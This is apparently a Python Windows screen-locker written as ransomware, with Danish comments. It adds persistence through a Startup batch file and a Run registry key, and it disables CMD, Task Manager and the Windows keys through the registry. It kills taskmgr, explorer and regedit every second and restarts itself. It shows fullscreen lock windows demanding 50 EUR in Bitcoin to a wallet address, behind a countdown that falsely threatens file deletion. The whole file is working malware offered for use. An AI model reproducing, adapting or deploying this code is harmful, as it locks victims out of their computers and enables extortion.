import tkinter as tk
from tkinter import messagebox
import os
import time
import subprocess
import winreg as reg
try:
    import screeninfo
    monitors_available = True
except:
    monitors_available = False

# Funktion til at deaktivere adgang til CMD og Task Manager via Registry
def disable_cmd_and_taskmgr():
    try:
        # Deaktiver Command Prompt
        key_cmd = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Policies\Microsoft\Windows\System", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key_cmd, "DisableCMD", 0, reg.REG_DWORD, 2)
        reg.CloseKey(key_cmd)
        
        # Deaktiver Task Manager
        key_taskmgr = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key_taskmgr, "DisableTaskMgr", 0, reg.REG_DWORD, 1)
        reg.CloseKey(key_taskmgr)
    except Exception as e:
        pass  # Ignorer fejl, hvis brugeren ikke har rettigheder

# Funktion til at blokere tastaturgenveje (som Alt+Tab, Ctrl+Esc)
def disable_keyboard_shortcuts():
    try:
        # Deaktiver Alt+Tab og andre genveje via Registry
        key_explorer = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key_explorer, "NoWinKeys", 0, reg.REG_DWORD, 1)
        reg.CloseKey(key_explorer)
    except Exception:
        pass

# Funktion til at dræbe specifikke processer (Task Manager, CMD, osv.)
def kill_processes():
    processes_to_kill = ["taskmgr.exe", "cmd.exe", "explorer.exe", "regedit.exe"]
    while True:
        for proc in processes_to_kill:
            try:
                subprocess.run(f"taskkill /f /im {proc}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
        time.sleep(1)  # Kontroller hvert sekund

# Funktion til at tjekke password
def check_password(entry, windows):
    password = entry.get()
    if password == "dsl":
        for window in windows:
            window.destroy()
        # Fjern startup script
        startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'ransomware.bat')
        if os.path.exists(startup_path):
            os.remove(startup_path)
        # Genaktiver de deaktiverede funktioner (valgfrit)
        try:
            key_cmd = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Policies\Microsoft\Windows\System", 0, reg.KEY_SET_VALUE)
            reg.DeleteValue(key_cmd, "DisableCMD")
            reg.CloseKey(key_cmd)
            key_taskmgr = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, reg.KEY_SET_VALUE)
            reg.DeleteValue(key_taskmgr, "DisableTaskMgr")
            reg.CloseKey(key_taskmgr)
        except:
            pass
    else:
        messagebox.showerror("Forkert", "Forkert kodeord. Prøv igen, eller betal!")

# Funktion til at opdatere timer
def update_timer(label, start_time, windows):
    elapsed = int(time.time() - start_time)
    remaining = max(86400 - elapsed, 0)  # 24 timer i sekunder
    hours = remaining // 3600
    minutes = (remaining % 3600) // 60
    seconds = remaining % 60
    label.config(text=f"Tid tilbage: {hours:02d}:{minutes:02d}:{seconds:02d}")
    if remaining > 0:
        label.after(1000, update_timer, label, start_time, windows)
    else:
        for window in windows:
            window.destroy()
        messagebox.showerror("Tid Udløbet", "Tiden er udløbet! Alle filer er slettet!")

# Funktion til at tilføje program til startup (Windows) - forbedret
def add_to_startup():
    script_path = os.path.abspath(__file__)
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'ransomware.bat')
    if not os.path.exists(startup_path):
        with open(startup_path, 'w') as bat_file:
            bat_file.write(f'@echo off\npython "{script_path}"\n')

    # Tilføj også til Windows Registry Run for ekstra sikkerhed (kører ved login)
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "SystemLock", 0, reg.REG_SZ, f'python "{script_path}"')
        reg.CloseKey(key)
    except Exception:
        pass  # Ignorer fejl, hvis rettigheder mangler

# Funktion til at sikre, at scriptet genstarter sig selv, hvis det lukkes
def self_restart_monitor():
    script_path = os.path.abspath(__file__)
    while True:
        try:
            # Tjek om scriptet kører (dette er en enkel metode, kan forbedres)
            process_name = os.path.basename(script_path)
            result = subprocess.run(f'tasklist | findstr {process_name}', shell=True, capture_output=True, text=True)
            if process_name not in result.stdout:
                # Hvis scriptet ikke kører, genstart det
                subprocess.Popen(f'python "{script_path}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except Exception:
            pass
        time.sleep(5)  # Tjek hvert 5. sekund

# Funktion til at skabe låseskærm på alle monitorer
def create_lock_screen():
    windows = []
    start_time = time.time()
    if monitors_available:
        try:
            monitors = screeninfo.get_monitors()
        except:
            monitors = [1]  # Fald tilbage til én skærm
    else:
        monitors = [1]

    for i, _ in enumerate(monitors):
        window = tk.Tk()
        window.title("SYSTEM LOCKED")
        window.attributes('-fullscreen', True)
        window.resizable(False, False)
        window.configure(bg='black')
        window.protocol("WM_DELETE_WINDOW", lambda: None)
        
        # Hvis screeninfo virker, placer vinduet på specifik monitor
        if monitors_available and len(monitors) > 1:
            monitor = monitors[i]
            window.geometry(f"{monitor.width}x{monitor.height}+{monitor.x}+{monitor.y}")

        # Bind tastaturgenveje for at forhindre flugt (Ctrl+Alt+Del, Alt+F4 osv.)
        window.bind("<Control-Alt-Delete>", lambda e: "break")
        window.bind("<Alt-F4>", lambda e: "break")
        window.bind("<Control-Escape>", lambda e: "break")

        frame = tk.Frame(window, bg='black')
        frame.pack(expand=True, fill='both')

        title_label = tk.Label(frame, text="!!! SYSTEMET ER LÅST !!!", font=("Courier New", 30, "bold"), fg='red', bg='black')
        title_label.pack(pady=20)

        message = (
            "DINE FILER ER KRYPTeret!\n\n"
            "Betal 50 EUR i Bitcoin til:\n"
            "bc1qsh9gysz6kdyukf6tp9eqxkac2c2csnvyevhs85\n\n"
            "Eller indtast kodeordet."
        )
        msg_label = tk.Label(frame, text=message, font=("Courier New", 14), fg='red', bg='black')
        msg_label.pack(pady=20)

        timer_label = tk.Label(frame, text="Tid tilbage: 24:00:00", font=("Courier New", 14, "bold"), fg='red', bg='black')
        timer_label.pack(pady=10)
        update_timer(timer_label, start_time, windows)

        password_entry = tk.Entry(frame, font=("Courier New", 12), width=30, show="*")
        password_entry.pack(pady=10)

        submit_button = tk.Button(frame, text="INDTAST KODEORD", font=("Courier New", 12, "bold"), fg='red', bg='black',
                                  command=lambda: check_password(password_entry, windows))
        submit_button.pack(pady=10)

        warning_label = tk.Label(frame, text="LUK IKKE PROGRAMMET - DATA SLETTES!",
                                 font=("Courier New", 10, "bold"), fg='red', bg='black')
        warning_label.pack(pady=20)

        windows.append(window)

    return windows

# Start programmet
if __name__ == "__main__":
    # Tilføj til startup
    add_to_startup()
    # Deaktiver CMD, Task Manager og tastaturgenveje
    disable_cmd_and_taskmgr()
    disable_keyboard_shortcuts()
    # Start proces-dræber i en separat tråd (simuleret med en loop)
    try:
        import threading
        threading.Thread(target=kill_processes, daemon=True).start()
        # Start overvågning for genstart af scriptet
        threading.Thread(target=self_restart_monitor, daemon=True).start()
    except:
        pass
    # Opret låseskærme
    windows = create_lock_screen()
    for window in windows:
        window.mainloop()